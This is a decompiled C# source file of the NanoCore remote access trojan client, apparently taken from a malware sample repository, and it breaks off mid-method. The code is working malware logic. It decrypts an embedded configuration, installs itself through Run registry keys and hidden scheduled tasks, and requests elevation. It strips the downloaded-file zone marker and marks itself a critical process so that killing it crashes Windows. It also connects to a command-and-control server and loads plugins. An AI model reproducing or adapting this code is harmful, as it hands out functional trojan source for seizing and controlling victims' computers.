// Decompiled with JetBrains decompiler
// Type: Class8
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class8
{
  public static List<Guid> list_0;
  public static List<Guid> list_1;
  public static Dictionary<Guid, GStruct0> dictionary_0;
  public static Queue<string> queue_0;
  private static string string_0;
  private static string string_1;
  private static string string_2;
  private static string string_3;
  public static Dictionary<string, object> dictionary_1;
  public static bool bool_0;
  public static bool bool_1;
  private static Mutex mutex_0;
  public static byte[] byte_0;
  public static byte[] byte_1;
  public static DateTime dateTime_0;
  public static Dictionary<string, Client> dictionary_2;
  public static List<GClass2> list_2;
  public static GClass6 gclass6_0;
  public static GClass6 gclass6_1;
  public static GClass8 gclass8_0;
  private static DateTime dateTime_1;
  public static StreamWriter streamWriter_0;
  public static bool bool_2;
  public static bool bool_3;
  public static ClientLoaderForm clientLoaderForm_0;
  public static Client client_0;
  private static bool bool_4;
  public static byte[] byte_2;
  private static GClass5 gclass5_0;
  public static bool bool_5;
  private static long long_0;
  public static DateTime dateTime_2 = DateTime.MaxValue;
  public static List<string> list_3;
  public static int int_0;
  public static int int_1;
  private static Assembly assembly_0;
  private static DateTime dateTime_3;

  public static void smethod_0()
  {
    Application.ThreadException += new ThreadExceptionEventHandler(Class8.smethod_58);
    AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(Class8.smethod_57);
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(Class8.smethod_69);
    Class8.list_3 = new List<string>();
    Class8.list_0 = new List<Guid>();
    Class8.dictionary_0 = new Dictionary<Guid, GStruct0>();
    Class8.dictionary_1 = new Dictionary<string, object>();
    Environment.CurrentDirectory = Application.StartupPath;
    if (!Class8.smethod_13())
      Class8.smethod_17();
    Class8.smethod_20();
    Class8.smethod_21();
    Class8.smethod_22();
    Class8.smethod_2();
    Class8.smethod_11();
    Class8.smethod_12();
    Class8.smethod_3();
    Class8.smethod_25();
    Class8.smethod_28();
    Class8.smethod_23();
    Class8.smethod_24();
    Class8.smethod_26();
    Class8.smethod_27();
    Class8.smethod_29();
    Class8.smethod_30();
    Class8.smethod_4();
    Class8.smethod_6();
    if (Class8.byte_1 != null)
    {
      Class8.smethod_9();
      Class8.smethod_8();
    }
    Class8.smethod_63();
    Class8.smethod_1();
    Class8.smethod_44();
  }

  private static void smethod_1()
  {
    Class8.client_0 = Class8.smethod_39();
    Class8.client_0.method_0(new Client.GDelegate6(Class8.smethod_70));
    Class8.client_0.method_4(new Client.GDelegate4(Class8.smethod_71));
    Class8.client_0.method_14(new Client.GDelegate9(Class8.smethod_72));
    Class8.client_0.method_2(new Client.GDelegate7(Class8.smethod_73));
    Class8.client_0.method_6(new Client.GDelegate2(Class8.smethod_76));
  }

  private static void smethod_2()
  {
    Class24.guid_0 = Class8.smethod_33();
    Class24.bool_0 = Class8.smethod_32();
    Class24.intptr_0 = Class9.GetCurrentProcess();
    Class24.string_0 = Class8.smethod_34(Class24.guid_0);
    Class24.string_1 = Path.Combine(Path.Combine(Class24.string_0, "Exceptions"), Class24.smethod_1().ToString());
    Class24.dateTime_0 = Class8.smethod_35(Class24.string_0);
    Class24.bool_1 = Environment.OSVersion.Version.Major > 5;
    GStruct1 gstruct1 = GStruct1.smethod_0(Class24.guid_0);
    Class24.string_2 = gstruct1.string_0;
    Class24.string_3 = gstruct1.string_1;
  }

  private static void smethod_3()
  {
    Class8.smethod_87("Builder settings loaded..");
    try
    {
      foreach (KeyValuePair<string, object> keyValuePair in Class8.dictionary_1)
        Class8.smethod_87(string.Format("{0} = {1}", (object) keyValuePair.Key, RuntimeHelpers.GetObjectValue(keyValuePair.Value)));
    }
    finally
    {
      Dictionary<string, object>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private static void smethod_4()
  {
    string path = Path.Combine(Class24.string_0, "catalog.dat");
    if (!System.IO.File.Exists(path))
      return;
    try
    {
      foreach (object obj in Class22.smethod_2(System.IO.File.ReadAllBytes(path)))
      {
        object objectValue = RuntimeHelpers.GetObjectValue(obj);
        Class8.list_0.Add((Guid) objectValue);
      }
      List<Guid> guidList = new List<Guid>();
      try
      {
        foreach (KeyValuePair<Guid, GStruct0> keyValuePair in Class8.dictionary_0)
        {
          if (!Class8.list_0.Contains(keyValuePair.Key))
            guidList.Add(keyValuePair.Key);
        }
      }
      finally
      {
        Dictionary<Guid, GStruct0>.Enumerator enumerator;
        enumerator.Dispose();
      }
      try
      {
        foreach (Guid key in guidList)
          Class8.dictionary_0.Remove(key);
      }
      finally
      {
        List<Guid>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "LoadPluginCatalog");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_5(Guid[] guid_0)
  {
    string path = Path.Combine(Class24.string_0, "catalog.dat");
    try
    {
      List<object> objectList = new List<object>();
      foreach (Guid guid in guid_0)
        objectList.Add((object) guid);
      byte[] bytes = Class22.smethod_1(objectList.ToArray());
      System.IO.File.WriteAllBytes(path, bytes);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "SavePluginCatalog");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_6()
  {
    string path = Path.Combine(Class24.string_0, "storage.dat");
    if (!System.IO.File.Exists(path))
      return;
    try
    {
      object[] objArray = Class22.smethod_2(System.IO.File.ReadAllBytes(path));
      DateTime t2 = (DateTime) objArray[0];
      if (DateTime.Compare(Class8.dateTime_0, t2) < 0)
      {
        Class8.dateTime_0 = t2;
        Class8.byte_1 = (byte[]) objArray[1];
        Class8.byte_0 = Class27.smethod_2(Class8.byte_1);
      }
      int num = objArray.Length - 1;
      for (int index = 2; index <= num; index += 4)
      {
        GStruct0 gstruct0 = new GStruct0()
        {
          guid_0 = (Guid) objArray[index],
          dateTime_0 = (DateTime) objArray[index + 1],
          string_0 = (string) objArray[index + 2],
          byte_1 = (byte[]) objArray[index + 3]
        };
        gstruct0.byte_0 = Class27.smethod_2(gstruct0.byte_1);
        if (Class8.list_0.Contains(gstruct0.guid_0))
        {
          if (Class8.dictionary_0.ContainsKey(gstruct0.guid_0))
          {
            if (DateTime.Compare(Class8.dictionary_0[gstruct0.guid_0].dateTime_0, gstruct0.dateTime_0) < 0)
              Class8.dictionary_0[gstruct0.guid_0] = gstruct0;
          }
          else
            Class8.dictionary_0.Add(gstruct0.guid_0, gstruct0);
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "LoadCachedPlugins");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_7()
  {
    string path = Path.Combine(Class24.string_0, "storage.dat");
    try
    {
      List<object> objectList = new List<object>();
      objectList.Add((object) Class8.dateTime_0);
      objectList.Add((object) Class8.byte_1);
      try
      {
        foreach (GClass2 gclass2 in Class8.list_2)
        {
          if (gclass2.bool_0)
          {
            objectList.Add((object) gclass2.guid_0);
            objectList.Add((object) gclass2.dateTime_0);
            objectList.Add((object) gclass2.string_0);
            objectList.Add((object) gclass2.byte_0);
          }
        }
      }
      finally
      {
        List<GClass2>.Enumerator enumerator;
        enumerator.Dispose();
      }
      byte[] bytes = Class22.smethod_1(objectList.ToArray());
      System.IO.File.WriteAllBytes(path, bytes);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "SaveCachedPlugins");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_8()
  {
    Class8.smethod_87("Initializing cached plugins..");
    try
    {
      foreach (KeyValuePair<Guid, GStruct0> keyValuePair in Class8.dictionary_0)
      {
        GStruct0 gstruct0 = keyValuePair.Value;
        Class23.smethod_0(gstruct0.byte_1, new GClass2()
        {
          string_0 = gstruct0.string_0,
          guid_0 = gstruct0.guid_0,
          bool_0 = true,
          byte_0 = gstruct0.byte_1,
          byte_1 = gstruct0.byte_0
        });
      }
    }
    finally
    {
      Dictionary<Guid, GStruct0>.Enumerator enumerator;
      enumerator.Dispose();
    }
    Class8.dictionary_0.Clear();
  }

  public static void smethod_9()
  {
    if (Class8.bool_5)
      return;
    Class8.bool_5 = true;
    Class8.dictionary_2 = new Dictionary<string, Client>();
    Class8.list_2 = new List<GClass2>();
    Class8.gclass6_0 = new GClass6(new GDelegate0(Class8.smethod_66));
    Class8.gclass6_1 = new GClass6(new GDelegate0(Class8.smethod_67));
    Class8.gclass8_0 = new GClass8(Class8.dictionary_1);
    Class8.smethod_10();
    Class8.smethod_93("settings.bin");
    Class8.gclass5_0 = new GClass5();
    Class8.gclass5_0.method_0(new GClass5.GDelegate1(Class8.smethod_94));
    Class8.gclass5_0.method_3(1000);
    Class8.gclass5_0.method_6();
  }

  private static void smethod_10()
  {
    Class8.gclass6_0.SetValue("ClientId", (object) Class24.guid_0);
    Class8.gclass6_0.SetValue("FirstRunDate", (object) Class24.dateTime_0);
    Class8.gclass6_0.SetValue("IsRunningAsAdmin", (object) Class24.bool_0);
    Class8.gclass6_0.SetValue("IsVistaOrLater", (object) Class24.bool_1);
    Class8.gclass6_0.SetValue("ApplicationFolder", (object) Class24.string_0);
    Class8.gclass6_0.SetValue("ClientFriendlyName", (object) Class24.string_2);
    Class8.gclass6_0.SetValue("ClientExecutableName", (object) Class24.string_3);
    Class8.gclass6_0.SetValue("ProcessHandle", (object) Class24.intptr_0);
  }

  private static void smethod_11()
  {
    Class8.string_1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    Class8.string_0 = Path.Combine(Class24.string_2, Class24.string_3);
    Class8.string_3 = Path.Combine(Class24.string_0, Class8.string_0);
    Class8.string_2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), Class8.string_0);
  }

  private static void smethod_12()
  {
    Class8.queue_0 = new Queue<string>();
    try
    {
      if (!Directory.Exists(Class24.string_1))
        return;
      foreach (string file in Directory.GetFiles(Class24.string_1, "*.dat"))
        Class8.queue_0.Enqueue(Path.GetFileNameWithoutExtension(file));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "InitializeExceptionQueue");
      ProjectData.ClearProjectError();
    }
  }

  private static bool smethod_13()
  {
    byte[] buffer = Class8.smethod_16();
    if (buffer == null)
      return false;
    BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(buffer));
    Class8.byte_2 = Class8.smethod_19(binaryReader.ReadBytes(binaryReader.ReadInt32()), Class8.smethod_18(Assembly.GetExecutingAssembly()));
    Class22.smethod_0(Class8.byte_2);
    object[] sourceArray = Class22.smethod_2(binaryReader.ReadBytes(binaryReader.ReadInt32()));
    int index1;
    object[] objArray1 = new object[(int) sourceArray[index1] - 1 + 1];
    int sourceIndex1 = index1 + 1;
    Array.Copy((Array) sourceArray, sourceIndex1, (Array) objArray1, 0, objArray1.Length);
    int index2 = sourceIndex1 + objArray1.Length;
    object[] objArray2 = new object[(int) sourceArray[index2] - 1 + 1];
    int sourceIndex2 = index2 + 1;
    Array.Copy((Array) sourceArray, sourceIndex2, (Array) objArray2, 0, objArray2.Length);
    Class8.smethod_14(objArray2);
    Class8.smethod_15(objArray1);
    return true;
  }

  private static void smethod_14(object[] object_0)
  {
    int num = object_0.Length - 1;
    for (int index = 0; index <= num; index += 2)
    {
      string key = (string) object_0[index];
      object objectValue = RuntimeHelpers.GetObjectValue(object_0[index + 1]);
      if (Class8.dictionary_1.ContainsKey(key))
        Class8.dictionary_1[key] = RuntimeHelpers.GetObjectValue(objectValue);
      else
        Class8.dictionary_1.Add(key, RuntimeHelpers.GetObjectValue(objectValue));
    }
  }

  private static void smethod_15(object[] object_0)
  {
    if (object_0.Length == 0)
      return;
    Class8.dateTime_0 = (DateTime) object_0[0];
    Class8.byte_1 = (byte[]) object_0[1];
    Class8.byte_0 = Class27.smethod_2(Class8.byte_1);
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; index += 4)
    {
      GStruct0 gstruct0 = new GStruct0()
      {
        guid_0 = (Guid) object_0[index],
        dateTime_0 = (DateTime) object_0[index + 1],
        string_0 = (string) object_0[index + 2],
        byte_1 = (byte[]) object_0[index + 3]
      };
      gstruct0.byte_0 = Class27.smethod_2(gstruct0.byte_1);
      Class8.dictionary_0.Add(gstruct0.guid_0, gstruct0);
    }
  }

  private static byte[] smethod_16()
  {
    IntPtr resourceEx = Class9.FindResourceEx(IntPtr.Zero, 10, 1, (short) 0);
    if (resourceEx == IntPtr.Zero)
      return (byte[]) null;
    IntPtr intptr_0 = Class9.LoadResource(IntPtr.Zero, resourceEx);
    if (intptr_0 == IntPtr.Zero)
      return (byte[]) null;
    int num = Class9.SizeofResource(IntPtr.Zero, resourceEx);
    if (num == 0)
      return (byte[]) null;
    IntPtr source = Class9.LockResource(intptr_0);
    if (source == IntPtr.Zero)
      return (byte[]) null;
    byte[] destination = new byte[num - 1 + 1];
    Marshal.Copy(source, destination, 0, destination.Length);
    return destination;
  }

  private static void smethod_17()
  {
  }

  private static Guid smethod_18(Assembly assembly_1) => new Guid(((GuidAttribute) assembly_1.GetCustomAttributes(typeof (GuidAttribute), false)[0]).Value);

  private static byte[] smethod_19(byte[] byte_3, Guid guid_0)
  {
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(guid_0.ToByteArray(), guid_0.ToByteArray(), 8);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16);
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16);
    return rijndaelManaged.CreateDecryptor().TransformFinalBlock(byte_3, 0, byte_3.Length);
  }

  private static void smethod_20()
  {
    if (!Class24.smethod_16())
      return;
    if (Class9.AllocConsole())
      Class8.bool_2 = true;
    try
    {
      Class8.streamWriter_0 = new StreamWriter("client.log", true);
      Class8.streamWriter_0.AutoFlush = true;
      Class8.bool_3 = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      if (Class8.bool_2)
        Class8.smethod_86(exception_0, "HandleEnableDebugModeBuilderSetting");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_21()
  {
    int num = Class24.smethod_22();
    for (int index = 0; index <= num; index += 250)
    {
      bool createdNew;
      Class8.mutex_0 = new Mutex(true, string.Format("Global\\{{{0}}}", (object) Class24.smethod_2()), out createdNew);
      if (createdNew)
        return;
      Thread.Sleep(250);
    }
    Class8.smethod_42();
  }

  private static void smethod_22()
  {
    if (Class24.smethod_17() == 0)
      return;
    Thread.Sleep(Class24.smethod_17());
  }

  private static void smethod_23()
  {
    if (!Class24.smethod_11())
      return;
    Class8.smethod_38(Application.ExecutablePath);
  }

  private static void smethod_24()
  {
    if (!Class24.smethod_8() || Class24.bool_0)
      return;
    ProcessStartInfo startInfo = new ProcessStartInfo(Application.ExecutablePath);
    startInfo.WorkingDirectory = Environment.CurrentDirectory;
    startInfo.Verb = "runas";
    try
    {
      Process.Start(startInfo);
      Class8.smethod_42();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "HandleRequestElevationBuilderSetting");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_25()
  {
    if (!Class24.smethod_7())
      return;
    if (Class24.bool_0)
      Class8.smethod_54();
    else
      Class8.smethod_52();
  }

  private static void smethod_26()
  {
    if (!Class24.smethod_12())
      return;
    Class26.smethod_2();
  }

  private static void smethod_27()
  {
    if (!Class24.smethod_13())
      return;
    Class8.smethod_40(true);
  }

  private static void smethod_28()
  {
    if (!Class24.smethod_9() || !Class24.bool_1)
      return;
    string str1 = Class24.bool_0 ? Class8.string_2 : Class8.string_3;
    if (Class24.bool_0)
    {
      if (Class24.smethod_10() == null)
        return;
      string str2 = Encoding.UTF8.GetString(Class24.smethod_10());
      if (!string.Equals(Application.ExecutablePath, str1, StringComparison.InvariantCultureIgnoreCase))
      {
        string string_5 = str2.Replace("#EXECUTABLEPATH", Application.ExecutablePath);
        if (Class8.smethod_47(Class24.string_2, string_5, 10000))
          Class8.smethod_37(Application.ExecutablePath);
      }
      if (!Class24.smethod_7())
        return;
      string string_5_1 = str2.Replace("#EXECUTABLEPATH", str1);
      Class8.smethod_47(Class24.string_2 + " Task", string_5_1, 10000);
    }
    else
    {
      string string2 = Class24.string_2;
      if (string.Equals(Application.ExecutablePath, str1, StringComparison.InvariantCultureIgnoreCase))
        string2 += " Task";
      else if (!string.Equals(Application.ExecutablePath, Class8.smethod_36(), StringComparison.InvariantCultureIgnoreCase))
        return;
      if (!Class8.smethod_48(string2, 10000))
        return;
      Class8.smethod_42();
    }
  }

  private static void smethod_29()
  {
    if (!Class24.smethod_31() || string.Equals(Application.ExecutablePath, Class8.string_3, StringComparison.InvariantCultureIgnoreCase) || string.Equals(Application.ExecutablePath, Class8.string_2, StringComparison.InvariantCultureIgnoreCase))
      return;
    int num;
    ThreadPool.QueueUserWorkItem((WaitCallback) (object_0 => ((Delegate0) (() => num = (int) MessageBox.Show(Class24.smethod_33(), Class24.smethod_32(), MessageBoxButtons.OK, (MessageBoxIcon) Class24.smethod_34(), MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly)))()));
  }

  private static void smethod_30()
  {
    if (!Class24.smethod_14())
      return;
    ThreadPool.QueueUserWorkItem((WaitCallback) (object_0 => ((Delegate0) (() => Class8.smethod_95()))()));
  }

  private static bool smethod_31()
  {
    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false);
    return registryKey == null || Conversions.ToInteger(registryKey.GetValue("EnableLUA", (object) 1)) == 1;
  }

  private static bool smethod_32() => !Class8.smethod_31() || new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

  private static Guid smethod_33()
  {
    string g = Class26.smethod_0("SOFTWARE\\Microsoft\\Cryptography", "MachineGuid");
    return string.IsNullOrEmpty(g) ? Guid.Empty : new Guid(g);
  }

  private static string smethod_34(Guid guid_0)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), guid_0.ToString().ToUpper());
    try
    {
      Directory.CreateDirectory(path);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "GetAndCreateApplicationFolderPath");
      ProjectData.ClearProjectError();
    }
    return path;
  }

  private static DateTime smethod_35(string string_4)
  {
    DateTime dateTime = DateTime.UtcNow;
    string path = Path.Combine(string_4, "run.dat");
    try
    {
      if (System.IO.File.Exists(path))
        dateTime = DateTime.FromBinary(BitConverter.ToInt64(System.IO.File.ReadAllBytes(path), 0));
      else
        System.IO.File.WriteAllBytes(path, BitConverter.GetBytes(dateTime.ToBinary()));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "GetAndCreateFirstRunDate");
      ProjectData.ClearProjectError();
    }
    return dateTime;
  }

  private static string smethod_36()
  {
    string path1 = Path.Combine(Class24.string_0, "task.dat");
    if (!System.IO.File.Exists(path1))
      return (string) null;
    try
    {
      string path2 = System.IO.File.ReadAllText(path1);
      if (System.IO.File.Exists(path2))
        return path2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "GetUACTaskPath");
      ProjectData.ClearProjectError();
    }
    return (string) null;
  }

  private static void smethod_37(string string_4)
  {
    string path = Path.Combine(Class24.string_0, "task.dat");
    try
    {
      System.IO.File.WriteAllText(path, string_4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "CreateUACTaskPath");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_38(string string_4) => Class9.DeleteFile(string_4 + ":Zone.Identifier");

  public static Client smethod_39()
  {
    Client client = new Client();
    client.method_27(Class24.smethod_23());
    client.method_29(Class24.smethod_24());
    client.method_19(Class24.smethod_25());
    client.method_21(Class24.smethod_26());
    client.method_25(Class24.smethod_27());
    client.method_40(Class24.smethod_28());
    if (Class24.smethod_28())
    {
      IPAddress address = (IPAddress) null;
      List<IPAddress> ipAddressList = new List<IPAddress>();
      if (IPAddress.TryParse(Class24.smethod_29(), out address))
        ipAddressList.Add(address);
      if (IPAddress.TryParse(Class24.smethod_30(), out address))
        ipAddressList.Add(address);
      client.method_42(ipAddressList.ToArray());
    }
    return client;
  }

  public static void smethod_40(bool bool_6)
  {
    if (!Class24.bool_0)
      return;
    try
    {
      Process.EnterDebugMode();
      int int_1 = bool_6 ? 1 : 0;
      int num = Class9.NtSetInformationProcess(Class24.intptr_0, 29, ref int_1, 4);
      if (num != 0)
        Class8.smethod_86(new Exception(string.Format("Call to NtSetInformationProcess has failed with error code {0:X}", (object) num)), "UpdateProcessBreakOnTermination");
      Process.LeaveDebugMode();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "UpdateProcessBreakOnTermination");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_41()
  {
    Process.Start(Application.ExecutablePath);
    Class8.smethod_42();
  }

  public static void smethod_42()
  {
    Class8.smethod_40(false);
    Environment.Exit(0);
  }

  public static void smethod_43()
  {
    Thread.Sleep(Class24.smethod_18());
    Class8.smethod_44();
  }

  private static void smethod_44()
  {
    string string_2 = Class8.smethod_65();
    Class8.smethod_87(string.Format("Connecting to {0}:{1}..", (object) string_2, (object) Class24.smethod_6()));
    Class8.client_0.method_44(string_2, Class24.smethod_6());
  }

  public static void smethod_45()
  {
    if (Interlocked.Increment(ref Class8.long_0) != 1L)
      return;
    Class26.smethod_1();
    Class8.smethod_40(false);
  }

  public static void smethod_46()
  {
    if (Class8.long_0 == 0L || Interlocked.Decrement(ref Class8.long_0) != 0L)
      return;
    if (Class24.smethod_12())
      Class8.smethod_26();
    if (!Class24.smethod_13())
      return;
    Class8.smethod_27();
  }

  private static bool smethod_47(string string_4, string string_5, int int_2)
  {
    try
    {
      string tempFileName = Path.GetTempFileName();
      string string_5_1 = string.Format("/create /f /tn \"{0}\" /xml \"{1}\"", (object) string_4, (object) tempFileName);
      System.IO.File.WriteAllText(tempFileName, string_5);
      Process process = Process.Start(Class8.smethod_50("schtasks.exe", string_5_1));
      bool flag;
      if (process.WaitForExit(int_2))
        flag = process.ExitCode == 0;
      System.IO.File.Delete(tempFileName);
      return flag;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "CreateScheduledTask");
      ProjectData.ClearProjectError();
    }
    return false;
  }

  private static bool smethod_48(string string_4, int int_2)
  {
    try
    {
      Process process = Process.Start(Class8.smethod_50("schtasks.exe", string.Format("/run /tn \"{0}\"", (object) string_4)));
      bool flag;
      if (process.WaitForExit(int_2))
        flag = process.ExitCode == 0;
      return flag;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "RunScheduledTask");
      ProjectData.ClearProjectError();
    }
    return false;
  }

  private static bool smethod_49(string string_4, int int_2)
  {
    try
    {
      Process process = Process.Start(Class8.smethod_50("schtasks.exe", string.Format("/delete /f /tn \"{0}\"", (object) string_4)));
      bool flag;
      if (process.WaitForExit(int_2))
        flag = process.ExitCode == 0;
      return flag;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteScheduledTask");
      ProjectData.ClearProjectError();
    }
    return false;
  }

  private static ProcessStartInfo smethod_50(string string_4, string string_5) => new ProcessStartInfo(string_4, string_5)
  {
    UseShellExecute = false,
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden
  };

  private static bool smethod_51(string string_4)
  {
    if (!System.IO.File.Exists(string_4))
      return false;
    FileStream stream_0 = (FileStream) null;
    try
    {
      stream_0 = System.IO.File.OpenRead(Application.ExecutablePath);
      string Left = Class27.smethod_3((Stream) stream_0);
      stream_0.Close();
      stream_0 = System.IO.File.OpenRead(string_4);
      string Right = Class27.smethod_3((Stream) stream_0);
      stream_0.Close();
      return Operators.CompareString(Left, Right, false) == 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "CompareFileHashes");
      ProjectData.ClearProjectError();
    }
    finally
    {
      stream_0?.Close();
    }
    return false;
  }

  private static void smethod_52()
  {
    try
    {
      if (Class8.smethod_56())
        return;
      Directory.CreateDirectory(Path.GetDirectoryName(Class8.string_3));
      if (!Class8.smethod_51(Class8.string_3))
      {
        System.IO.File.Delete(Class8.string_3);
        System.IO.File.Copy(Application.ExecutablePath, Class8.string_3);
      }
      Registry.CurrentUser.OpenSubKey(Class8.string_1, true).SetValue(Class24.string_2, (object) Class8.string_3);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "AddUserStartup");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_53()
  {
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class8.string_1, true);
      if (registryKey.GetValue(Class24.string_2, (object) null) != null)
        registryKey.DeleteValue(Class24.string_2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteUserStartup");
      ProjectData.ClearProjectError();
    }
    try
    {
      if (string.Equals(Application.ExecutablePath, Class8.string_3, StringComparison.InvariantCultureIgnoreCase))
        return;
      System.IO.File.Delete(Class8.string_3);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteUserStartup");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_54()
  {
    try
    {
      Directory.CreateDirectory(Path.GetDirectoryName(Class8.string_2));
      if (!Class8.smethod_51(Class8.string_2))
      {
        System.IO.File.Delete(Class8.string_2);
        System.IO.File.Copy(Application.ExecutablePath, Class8.string_2);
      }
      Registry.LocalMachine.OpenSubKey(Class8.string_1, true).SetValue(Class24.string_2, (object) Class8.string_2);
      Class8.smethod_53();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "AdminAdminStartup");
      ProjectData.ClearProjectError();
    }
  }

  private static void smethod_55()
  {
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class8.string_1, true);
      if (registryKey.GetValue(Class24.string_2, (object) null) != null)
        registryKey.DeleteValue(Class24.string_2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteAdminStartup");
      ProjectData.ClearProjectError();
    }
    try
    {
      if (string.Equals(Application.ExecutablePath, Class8.string_2, StringComparison.InvariantCultureIgnoreCase))
        return;
      System.IO.File.Delete(Class8.string_2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteAdminStartup");
      ProjectData.ClearProjectError();
    }
  }

  private static bool smethod_56()
  {
    try
    {
      return string.Equals(Conversions.ToString(Registry.LocalMachine.OpenSubKey(Class8.string_1, false).GetValue(Class24.string_2, (object) string.Empty)), Class8.string_2, StringComparison.InvariantCultureIgnoreCase);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "CheckForAdminSetup");
      ProjectData.ClearProjectError();
    }
    return false;
  }

  private static void smethod_57(object sender, UnhandledExceptionEventArgs e) => Class8.smethod_59((Exception) e.ExceptionObject);

  private static void smethod_58(object sender, ThreadExceptionEventArgs e) => Class8.smethod_59(e.Exception);

  private static void smethod_59(Exception exception_0)
  {
    try
    {
      Class8.smethod_86(exception_0, "HandleException");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Class8.smethod_60(exception_0);
    try
    {
      Thread.Sleep(Class24.smethod_19());
      Process.Start(Application.ExecutablePath);
      Class8.smethod_42();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_60(Exception exception_0)
  {
    try
    {
      string string_1 = Class26.smethod_6(exception_0);
      string lower = BitConverter.ToString(Class27.smethod_1(string_1)).Replace("-", string.Empty).ToLower();
      string path = Path.Combine(Class24.string_1, lower + ".dat");
      if (System.IO.File.Exists(path))
        return;
      Directory.CreateDirectory(Class24.string_1);
      System.IO.File.WriteAllBytes(path, Class22.smethod_1(new object[1]
      {
        (object) string_1
      }));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string smethod_61(string string_4)
  {
    string path = Path.Combine(Class24.string_1, string_4 + ".dat");
    return !System.IO.File.Exists(path) ? string.Empty : (string) Class22.smethod_2(System.IO.File.ReadAllBytes(path))[0];
  }

  public static void smethod_62(string string_4)
  {
    try
    {
      System.IO.File.Delete(Path.Combine(Class24.string_1, string_4 + ".dat"));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "DeleteExceptionLog");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_63()
  {
